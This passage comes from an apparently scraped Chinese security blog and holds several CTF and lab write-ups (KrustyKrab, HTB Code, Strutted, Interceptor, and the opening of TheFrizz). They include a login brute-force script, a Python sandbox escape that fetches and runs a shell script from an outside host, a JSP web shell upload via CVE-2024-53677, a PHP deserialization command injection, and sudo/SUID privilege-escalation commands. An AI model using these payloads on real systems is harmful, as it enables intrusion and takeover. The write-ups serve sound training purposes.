/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.131/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: html,php,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 11539]\r/.html (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== 在网页源码中发现注释，可以访问**/finexo**\nWeak Passwd #\r注意到这里的团队成员，都是海绵宝宝中的人物\n来到登录页面，发现这里存在验证码校验，并且有三种回显：用户不存在、密码错误、以及验证码错误\n经过尝试，发现存在的用户是：spongebob\n这里的验证码生成逻辑是直接从当前页面进行请求，然后通过Canvas绘制到图片上\nfunction refreshCaptcha() {\rvar xhr = new XMLHttpRequest();\rxhr.open(\u0026#39;GET\u0026#39;, \u0026#39;?action=generateCaptcha\u0026#39;, true);\rxhr.onload = function() {\rif (xhr.status === 200) {\rvar newCaptcha = xhr.responseText;\rconst canvas = document.getElementById(\u0026#34;captcha-canvas\u0026#34;);\rconst ctx = canvas.getContext(\u0026#34;2d\u0026#34;);\rcanvas.width = 150;\rcanvas.height = 50;\rctx.fillStyle = \u0026#34;white\u0026#34;;\rctx.fillRect(0, 0, canvas.width, canvas.height);\rctx.fillStyle = \u0026#34;black\u0026#34;;\rctx.font = \u0026#34;30px Arial\u0026#34;;\rctx.fillText(newCaptcha, 10,35);\r}\r};\rxhr.send();\r}\rrefreshCaptcha()\rwindow.onload =function() {\rParticles.init({\rselector:\r\u0026#39;.background\u0026#39;,\rcolor:\u0026#39;white\u0026#39;\r});\r}; 在另一个js文件中发现了一串密文\nJSFuck Language Translator - Online Decoder/Compiler/Unobfuscator 进行解密后得到验证码的生成逻辑，可以看到是PHP的mt_srand伪随机问题，使用了当前时间作为种子\nfunction generateCaptcha() { $characters = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#34;; $code = \u0026#34;\u0026#34;; $seed = time(); mt_srand($seed); for ($i = 0; $i \u0026lt; 4; $i++) { $code .= $characters[mt_rand(0, strlen($characters) - 1)]; } $_SESSION[\u0026#39;captcha\u0026#39;] = strtolower($code); return $code; } 通过写脚本分别请求来进行爆破的话\nimport requests\rcaptcha_url = \u0026#39;http://192.168.56.132/finexo/login.php?action=generateCaptcha\u0026#39;\rlogin_url = \u0026#39;http://192.168.56.132/finexo/login.php\u0026#39;\r# 创建会话对象\rsession = requests.Session()\rcnt =0\rwith open(\u0026#39;/usr/share/wordlists/rockyou_utf_8.txt\u0026#39;, \u0026#39;r\u0026#39;) as f:\rfor password in f.readlines():\r# 获取验证码\rcaptcha = session.get(captcha_url).text\rpassword = password.strip() # 去除密码两端的空白字符\rdata={\r\u0026#39;username\u0026#39;:\u0026#39;spongebob\u0026#39;,\r\u0026#39;password\u0026#39;:f\u0026#39;{password}\u0026#39;,\r\u0026#39;captcha\u0026#39;: captcha\r}\r# 使用会话对象发送POST请求进行登录\rtry_login = session.post(login_url, data=data)\rcnt +=1\r# 输出登录结果\rprint(f\u0026#34;Attempting with password: {password} {cnt}\u0026#34;)\r# 检查是否登录成功，假设返回的文本包含某个成功标志\rif \u0026#34;successful\u0026#34; in try_login.text:\rprint(f\u0026#34;Login successful with password: {password}\u0026#34;)\rbreak 也可以尝试弱口令，他的用户名是spongebob，因此尝试密码为squarepants，成功登录！！\nspongebob：squarepants SQL Injection #\r查看用户信箱，发现了一个类似于管理员的用户：Administratro\n同时下方存在一个Send的请求，用于发送信息。\n到这里如果你想的是XSS来获取到管理员的身份凭证，那么你的思路是正常的。但是这里并不会有任何回应。\n注意到这里存在一个修改用户信息的表单，同时还可以上传头像。\n上传一个木马？？？思路很好，但是这里也不是😂\n抓包发现可以修改用户名，导致其他用户的密码被修改。\n登录之后，可以看到存在一个命令行工具，反弹shell拿到www-data\nOwn KrustyKrab #\rwww-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -l\rsudo -l\rsudo: unable to resolve host KrustyKrab: Temporary failure in name resolution\rMatching Defaults entries for www-data on KrustyKrab:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\ruse_pty\rUser www-data may run the following commands on KrustyKrab:\r(KrustyKrab) NOPASSWD: /usr/bin/split 可以看到存在以KrustyKrab身份运行split命令\nsplit | GTFOBins sudo -u KrustyKrab /usr/bin/split --filter=/bin/sh /dev/stdin 拿到User.txt\n写入ssh密钥进行登录\nOwn SpongeBob #\r查看sudo -l\nKrustyKrab@KrustyKrab:~$ sudo -l\rsudo: unable to resolve host KrustyKrab: Temporary failure in name resolution\rMatching Defaults entries for KrustyKrab on KrustyKrab:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser KrustyKrab may run the following commands on KrustyKrab:\r(spongeBob) NOPASSWD: /usr/bin/ttteeesssttt 将这个文件复制出来进行反编译查看\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\runsigned int v3; // eax\rconst char *v4; // rax\rchar s[11]; // [rsp+5h] [rbp-5Bh] BYREF\rint v7[12]; // [rsp+10h] [rbp-50h] BYREF\rint n; // [rsp+40h] [rbp-20h]\rint v9; // [rsp+44h] [rbp-1Ch]\rint m; // [rsp+48h] [rbp-18h]\rint v11; // [rsp+4Ch] [rbp-14h]\rint k; // [rsp+50h] [rbp-10h]\rint v13; // [rsp+54h] [rbp-Ch]\rint j; // [rsp+58h] [rbp-8h]\rint i; // [rsp+5Ch] [rbp-4h]\rv3 = time(0LL);\rsrand(v3);\rfor ( i = 0; i \u0026lt;= 9; ++i )\rv7[i] = i;\rshuffle(v7, 10LL);\rputs(\u0026#34;\\nSpongebob forgot how to make Krabby Patty, You need to help him!\u0026#34;);\rputs(\u0026#34;\\nCurrent shuffled recipe order:\u0026#34;);\rfor ( j = 0; j \u0026lt;= 9; ++j )\rprintf(\u0026#34;%c: %s\\n\u0026#34;, (unsigned int)labels[j], (\u0026amp;ingredients)[v7[j]]);\rputs(\u0026#34;\\nPlease enter the correct order using letters (e.g., ABCDEFGHIJ):\u0026#34;);\rwhile ( 1 )\r{\rwhile ( 1 )\r{\rprintf(\u0026#34;Enter 10 letters (A-J): \u0026#34;);\r__isoc99_scanf(\u0026#34;%10s\u0026#34;, s);\rwhile ( getchar() != 10 )\r;\rif ( strlen(s) == 10 )\rbreak;\rputs(\u0026#34;Error: You must enter exactly 10 letters!\u0026#34;);\r}\rv13 = 1;\rfor ( k = 0; k \u0026lt;= 9; ++k )\r{\rif ( s[k] \u0026lt;= 64 || s[k] \u0026gt; 74 )\r{\rv13 = 0;\rbreak;\r}\r}\rif ( v13 )\rbreak;\rputs(\u0026#34;Error: Contains invalid characters! Use only A-J.\u0026#34;);\r}\rv11 = 1;\rfor ( m = 0; m \u0026lt;= 9; ++m )\r{\rv9 = -1;\rfor ( n = 0; n \u0026lt;= 9; ++n )\r{\rif ( labels[n] == s[m] )\r{\rv9 = n;\rbreak;\r}\r}\rif ( v9 == -1 || m != v7[v9] )\r{\rv11 = 0;\rbreak;\r}\r}\rif ( v11 )\rv4 = \u0026#34;Validation successful! Perfect Krabby Patty!\u0026#34;;\relse\rv4 = \u0026#34;Validation failed! This is not the correct recipe!\u0026#34;;\rprintf(\u0026#34;\\n%s\\n\u0026#34;, v4);\rif ( v11 )\rsystem(\u0026#34;/bin/bash -p\u0026#34;);\rreturn 0;\r} 似乎是要做一个蟹黄堡？但是没有配方怎么办呢，查看到目录下还有一个GIF图片格式的文件\n修改一下后缀名可以看到图片内容\n这是海绵宝宝被海霸王搞了的那一集，海霸王把腌野菜放在了舌头下面，然后骗海绵宝宝说他没有放腌野菜，最后甚至都忘记了怎么做蟹黄堡，好在他最后凭借潜意识想起来了怎么做。\n因此配方的顺序就有了\n底部面包 肉饼 生菜 奶酪 洋葱 西红柿 番茄酱 芥末 腌野菜 顶部面包 可以看到成功帮海绵宝宝找回了自我！！！\nOwn Squidward #\r可以查看到是需要key1和key2连起来进行md5加密\n查看key2.jpeg\n如果你认为这是一个misc的话，那就想麻烦了。\n实际上章鱼哥的密码就是两个文件的md5值拼起来再次进行md5\nRoot #\r注意到当前文件夹中有一个laststep文件，并且设置了SUID\n进行反编译，非常简单\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rsetgid(0);\rsetuid(0);\rsystem(\u0026#34;cat /etc/shadow\u0026#34;);\rreturn 0;\r} 你或许已经猜到了要用到路径劫持了吧\n注意这里要给chmod +x执行权限哦\nexport PATH=.:$PATH Summary #\rUser：从登录页面弱口令进入后台，通过修改任意用户密码登录到管理员后台，执行命令拿到www-data权限，通过split拿到KrustyKrab用户。\nRoot：逆向分析加上给出的GIF图片提示，输入正确序列可以拿到spongebob的权限。对文件进行md5加密操作拿到squidward密码，最后通过路径劫持提权到Root\n","date":"2025-03-27","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-krustykrab/","section":"Posts","summary":"","title":"HackMyVM-KrustyKrab","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Code ❯ nmap code.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)\r| 256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\r|_ 256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\r5000/tcp open http Gunicorn 20.0.4\r|_http-title: Python Code Editor\r|_http-server-header: gunicorn/20.0.4 Own www-data #\rSSTI 注入 - Hello CTF 进入到5000端口是一个python代码执行窗口\n过滤了import和一些关键词，尝试寻找eval函数\nfor i in range(500):\rtry:\rx = \u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[i].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;]\rif \u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39; in x:\rprint(i)\rexcept Exception as e:\rcontinue 用加号来进行绕过，即可执行命令\nprint(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;ls /\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;)) print(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;wget 10.10.xx.xx/shell.sh -O /tmp/shell.sh\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;))\rprint(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;bash /tmp/shell.sh\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;)) 得到反弹Shell\n拿到User\n当然，你也可以选择一个更加优雅的方式\nobj = globals()[\u0026#34;__buil\u0026#34; + \u0026#34;tins__\u0026#34;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;]\rresult = obj(\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).pop\u0026#39;+\u0026#39;en(\u0026#34;ls\u0026#34;).rea\u0026#39;+\u0026#39;d()\u0026#39;)\rprint(result) Own Martin #\r在app/instance目录下发现一个database.db，得到martin的密码hash\n[root@kali] /home/kali/Code ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 Using default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rXXXXXXXXXXXXXXXXX (?) Root #\r查看sudo -l\nmartin@code:~$ sudo -l\rMatching Defaults entries for martin on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser martin may run the following commands on localhost:\r(ALL : ALL) NOPASSWD: /usr/bin/backy.sh 查看脚本内容\n#!/bin/bash\rif [[ $# -ne 1 ]]; then\r/usr/bin/echo \u0026#34;Usage: $0 \u0026lt;task.json\u0026gt;\u0026#34;\rexit 1\rfi\rjson_file=\u0026#34;$1\u0026#34;\rif [[ ! -f \u0026#34;$json_file\u0026#34; ]]; then\r/usr/bin/echo \u0026#34;Error: File \u0026#39;$json_file\u0026#39; not found.\u0026#34;\rexit 1\rfi\rallowed_paths=(\u0026#34;/var/\u0026#34; \u0026#34;/home/\u0026#34;)\rupdated_json=$(/usr/bin/jq \u0026#39;.directories_to_archive |= map(gsub(\u0026#34;\\\\.\\\\./\u0026#34;; \u0026#34;\u0026#34;))\u0026#39; \u0026#34;$json_file\u0026#34;)\r/usr/bin/echo \u0026#34;$updated_json\u0026#34; \u0026gt; \u0026#34;$json_file\u0026#34;\rdirectories_to_archive=$(/usr/bin/echo \u0026#34;$updated_json\u0026#34; | /usr/bin/jq -r \u0026#39;.directories_to_archive[]\u0026#39;)\ris_allowed_path() {\rlocal path=\u0026#34;$1\u0026#34;\rfor allowed_path in \u0026#34;${allowed_paths[@]}\u0026#34;; do\rif [[ \u0026#34;$path\u0026#34; == $allowed_path* ]]; then\rreturn 0\rfi\rdone\rreturn 1\r}\rfor dir in $directories_to_archive; do\rif ! is_allowed_path \u0026#34;$dir\u0026#34;; then\r/usr/bin/echo \u0026#34;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\u0026#34;\rexit 1\rfi\rdone\r/usr/bin/backy \u0026#34;$json_file\u0026#34; 脚本的内容如下：\n检查参数：如果没有传入文件参数，输出用法说明并退出。\n文件存在性检查：检查 task.json 文件是否存在，若不存在则报错退出。\n处理 JSON 文件：使用 jq 移除 directories_to_archive 中的 ../，并更新文件内容。\n验证目录：遍历 directories_to_archive 中的目录，确保它们在允许的路径 /var/ 或 /home/ 下。\n执行备份：如果所有目录验证通过，执行 backy.sh 备份操作。\n这里可以使用双写绕过**../，创建一个task.json**\n{\r\u0026#34;directories_to_archive\u0026#34;: [\r\u0026#34;/home/..././root/\u0026#34; ],\r\u0026#34;destination\u0026#34;: \u0026#34;/tmp\u0026#34;\r} 然后执行\nsudo /usr/bin/backy.sh task.json 当然，也可以拿到SSH密钥\nSummary #\rUser：类似于SSTI或者Pyjail，进行命令执行，直接就拿到了user.txt。\nRoot：在database.db中拿到martin的密码进行解密，通过双写绕过目录限制，备份root文件夹，可以拿到root密钥。\n","date":"2025-03-23","externalUrl":null,"permalink":"/posts/2025/03/htb-code/","section":"Posts","summary":"","title":"HTB-Code","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Strutted ❯ nmap strutted.htb -sV PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http nginx 1.18.0 (Ubuntu) CVE-2024-53677 #\r存在一个Download路由可以下载到网站源码\n查看pom.xml发现使用的是struts2 6.3.0.1\nApache Struts2文件上传绕过致远程命令执行漏洞(CVE-2024-53677) - FreeBuf网络安全行业门户\n深度解析 Struts2 漏洞 CVE - 2024 - 53677：原理、利用与修复全攻略\n随意上传一张图片，可以看到响应中有存储路径\nPOST /upload.action HTTP/1.1\rHost: strutted.htb\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: multipart/form-data; boundary=---------------------------115439595428497934603121522453\rContent-Length: 1253\rOrigin: http://strutted.htb\rConnection: keep-alive\rReferer: http://strutted.htb/upload.action\rCookie: JSESSIONID=160DD7DCBCF29E8A673300CA18537126\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r-----------------------------115439595428497934603121522453\rContent-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;test.jpg\u0026#34;\rContent-Type: image/jpeg\rGIF89a\r\u0026lt;%@ page import=\u0026#34;java.io.*, java.util.*, java.net.*\u0026#34; %\u0026gt;\r\u0026lt;%\rString action = request.getParameter(\u0026#34;action\u0026#34;);\rString output = \u0026#34;\u0026#34;;\rtry {\rif (\u0026#34;cmd\u0026#34;.equals(action)) {\rString cmd = request.getParameter(\u0026#34;cmd\u0026#34;);\rif (cmd != null) {\rProcess p = Runtime.getRuntime().exec(cmd);\rBufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\rString line;\rwhile ((line = reader.readLine()) != null) {\routput += line + \u0026#34;\\\\n\u0026#34;;\r}\rreader.close();\r}\r} else {\routput = \u0026#34;Unknown action.\u0026#34;;\r}\r} catch (Exception e) {\routput = \u0026#34;Error: \u0026#34; + e.getMessage();\r}\rresponse.setContentType(\u0026#34;text/plain\u0026#34;);\rout.print(output);\r%\u0026gt;\r%\u0026gt;\r-----------------------------115439595428497934603121522453\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;;name=\u0026#34;top.UploadFileName\u0026#34;\r../../shell.jsp\r-----------------------------115439595428497934603121522453-- 注意这里的最上面的upload的需要首字母大写\n写一个反弹shell，拿到tomcat权限\n在tomcat-users.xml中拿到密码，可以登录到james用户\nRoot #\r查看sudo -l\njames@strutted:~$ sudo -l\rMatching Defaults entries for james on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser james may run the following commands on localhost:\r(ALL) NOPASSWD: /usr/sbin/tcpdump tcpdump | GTFOBins james@strutted:~$ COMMAND=\u0026#39;chmod u+s /bin/bash\u0026#39;\rjames@strutted:~$ TF=$(mktemp)\rjames@strutted:~$ echo \u0026#34;$COMMAND\u0026#34; \u0026gt; $TF\rjames@strutted:~$ chmod +x $TF\rjames@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\rtcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes\rMaximum file limit reached: 1\r1 packet captured\r4 packets received by filter\r0 packets dropped by kernel\rjames@strutted:~$ ls -al /bin/bash\r-rwsr-xr-x 1 root root 1396520 Mar 14 2024 /bin/bash\rjames@strutted:~$ Summary #\rUser：通过Apache Strust2的文件上传漏洞，拿到tomcat的shell，查看到存在james用户，使用配置文件中的密码成功ssh登录。\nRoot：tcpdump提权，比较简单。\n","date":"2025-03-22","externalUrl":null,"permalink":"/posts/2025/03/htb-strutted/","section":"Posts","summary":"","title":"HTB-Strutted","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Interceptor ❯ nmap 192.168.56.123 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Gobuster #\r[root@kali] /home/kali/Interceptor ❯ gobuster dir -u http://192.168.56.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.123\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 10701]\r/wordpress (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.123/wordpress/]\r/backup (Status: 301) [Size: 317] [--\u0026gt; http://192.168.56.123/backup/]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/server-status (Status: 403) [Size: 279]\r/fping.php (Status: 200) [Size: 1958]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== Crack ZIP #\r在**/backup里发现一个压缩包，应该是涉及到了/fping**这个路由的。\n[root@kali] /home/kali/Interceptor ❯ zip2john secure-backup.zip \u0026gt;\u0026gt;zip.hash ⏎\rver 2.0 efh 5455 efh 7875 secure-backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=1692, decmplen=5976, crc=5ACA40D5 ts=509C cs=509c type=8\r[root@kali] /home/kali/Interceptor ❯ john zip.hash /usr/share/wordlists/rockyou.txt zxcvbnm (secure-backup.zip/source_code.php) source_code.php👇\n\u0026lt;?php\rsession_start();\r$valid_username = \u0026#34;\u0026#34;;\r$valid_password = \u0026#34;\u0026#34;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; isset($_POST[\u0026#39;login\u0026#39;])) {\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = $_POST[\u0026#39;password\u0026#39;];\rif ($username === $valid_username \u0026amp;\u0026amp; $password === $valid_password) {\r$_SESSION[\u0026#39;logged_in\u0026#39;] = true;\r} else {\r$login_error = \u0026#34;Invalid credentials.\u0026#34;;\r}\r}\rif (isset($_GET[\u0026#39;logout\u0026#39;])) {\rsession_destroy();\rheader(\u0026#34;Location: \u0026#34; . $_SERVER[\u0026#39;PHP_SELF\u0026#39;]);\rexit;\r}\rif (!isset($_SESSION[\u0026#39;logged_in\u0026#39;]) || $_SESSION[\u0026#39;logged_in\u0026#39;] !== true) {\r?\u0026gt;\r\u0026lt;?php\rexit;\r}\rclass pingTest {\rpublic $ipAddress = \u0026#34;127.0.0.1\u0026#34;;\rpublic $isValid = False;\rpublic $output = \u0026#34;\u0026#34;;\rfunction validate() {\rif (!$this-\u0026gt;isValid) {\rif (filter_var($this-\u0026gt;ipAddress, FILTER_VALIDATE_IP) || strpos($this-\u0026gt;ipAddress, \u0026#34;;\u0026#34;) !== false) {\r$this-\u0026gt;isValid = True;\r}\r}\r$this-\u0026gt;ping();\r}\rpublic function ping() {\rif ($this-\u0026gt;isValid) {\r$this-\u0026gt;output = shell_exec(\u0026#34;ping -c 3 $this-\u0026gt;ipAddress\u0026#34;); }\r}\r}\rif (isset($_POST[\u0026#39;session_data\u0026#39;])) {\r$pingTest = @unserialize(urldecode($_POST[\u0026#39;session_data\u0026#39;]));\rif ($pingTest !== false \u0026amp;\u0026amp; is_object($pingTest)) {\r$pingTest-\u0026gt;validate();\r} else {\rdie(\u0026#34;Deserialization error.\u0026#34;);\r}\r} else {\r$pingTest = new pingTest;\r$pingTest-\u0026gt;validate();\r}\r?\u0026gt; 可以看到登录成功之后，存在一个shell_exec的命令执行，可以控制参数，但是并不知道具体的用户名和密码。不过可以在源码中看到存在一个POST变量可以进行反序列化操作\nWPscan #\r没有发现能够直接利用的插件\n但是发现了一个调试日志\n似乎存在一个myapi的插件，这个插件没有被WPscan检查到\nOwn www-data #\r直接访问可以看到存在一个data.json\n里面包含了一些用户信息\n经过尝试，下面是可以登录的用户\nsakura_rose:rWzB2jRpUefo 接下来查看反序列化部分，检查IP只要合法或者存在分号就行\nfunction validate() {\rif (!$this-\u0026gt;isValid) {\rif (filter_var($this-\u0026gt;ipAddress, FILTER_VALIDATE_IP) || strpos($this-\u0026gt;ipAddress, \u0026#34;;\u0026#34;) !== false) {\r$this-\u0026gt;isValid = True;\r}\r}\r$this-\u0026gt;ping();\r} 因此可以如下构造\n\u0026lt;?php\rclass pingTest {\rpublic $ipAddress = \u0026#34;127.0.0.1|ls\u0026#34;;\rpublic $isValid = True;\rpublic $output = \u0026#34;\u0026#34;;\r}\recho urlencode(serialize(new pingTest())); 拿到www-data的反弹Shell\nOwn Vincent #\r查看到存在另外三个用户\n查看wp-config.php\n/** Database username */\rdefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; );\r/** Database password */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Lg:80/f,3\u0026gt;g+\u0026#39; ); 数据库中并没有可以利用的东西，不过这个密码可以尝试一下是否存在密码复用的问题。\n刚好可以登录到Vincent的ftp服务\n不能直接上传SSH密钥，这里只能通过www-data来切换用户\nOwn ftpuser #\r查看到vincent目录下有一个**.mozilla**目录，并且有很多数据库文件\n利用工具：blackunixteam/firefox_decrypt\n拿到密码尝试登录其他的用户\n刚好可以切换到ftpuser上\nRoot #\r查看ftpuser的特殊命令\nftpuser@debian:~$ sudo -l\rsudo -l\rMatching Defaults entries for ftpuser on debian:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\ruse_pty\rUser ftpuser may run the following commands on debian:\r(ALL : ALL) NOPASSWD: /usr/bin/installer\rftpuser@debian:~$ cat /usr/bin/installer\rcat /usr/bin/installer\r#!/bin/bash\r/usr/bin/apt-get install -y curl\r/usr/bin/wget --no-check-certificate -O /tmp/monitoring-agent.deb https://monitoring-secure.com/monitoring-agent.deb\r/usr/bin/dpkg -i /tmp/monitoring-agent.deb\r/bin/rm -rf /tmp/monitoring-agent.deb 可以看到，下载到deb包之后进行安装，随后又立即删除，这里可以尝试时间竞争，通过dpkg进行提权\ndpkg | GTFOBins 需要提前安装fpm\ngem install fpm 然后制作恶意deb上传上去\n[root@kali] /home/kali/Interceptor ❯ TF=$(mktemp -d)\r[root@kali] /home/kali/Interceptor ❯ echo \u0026#39;chmod u+s /bin/bash\u0026#39; \u0026gt; $TF/x.sh\r[root@kali] /home/kali/Interceptor ❯ fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF 这里我开了两个ftpuser的终端，可以再弹一个shell\n分别运行\nsudo /usr/bin/installer 还有\nftpuser@debian:/tmp$ cat poc.sh\rcat poc.sh\r#!/bin/bash\rfor i in {1..10000}\rdo\rcp /tmp/x_1.0_all.deb /tmp/monitoring-agent.deb\rdone\rftpuser@debian:/tmp$ bash poc.sh\rbash poc.sh 最后成功拿到root权限\nSummary #\rUser：wpscan扫到调试日志，根据插件查找到用户数据，进而登录到fping进行命令执行，拿到www-data。查看到wp-config的密码，存在密码复用，拿到vincent。通过解密vincent目录下的firefox用户数据，拿到了ftpuser权限。\nRoot：通过时间竞争，恶意覆盖deb包，然后通过dpkg进行提权。\n","date":"2025-03-21","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-interceptor/","section":"Posts","summary":"","title":"VulnVM-Interceptor","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/TheFrizz ❯ nmap thefrizz.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH for_Windows_9.5 (protocol 2.0)\r53/tcp open domain Simple DNS Plus\r80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)\r|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/\r|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped 将frizz.htb添加到**/etc/hosts**\n将frizzdc.frizz.htb添加到**/etc/hosts**\n发现是一个Gibbon服务，版本号是25.0.0\nCVE-2023-45878 